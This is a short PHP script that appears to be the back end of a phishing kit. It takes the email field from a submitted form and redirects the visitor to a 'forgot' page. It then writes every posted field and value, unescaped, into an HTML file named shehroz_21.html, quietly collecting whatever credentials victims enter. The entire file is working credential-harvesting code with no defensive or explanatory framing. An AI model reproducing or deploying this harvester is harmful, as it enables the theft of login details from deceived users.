<?php
$email = $_POST['email'];
header ('Location:forgot/index.php?email='.$email);
$handle = fopen("../shehroz_21.html", "a");
    foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
    }
    fwrite($handle, "<hr><br>\r\n");
    fclose($handle);
    exit;
    ?>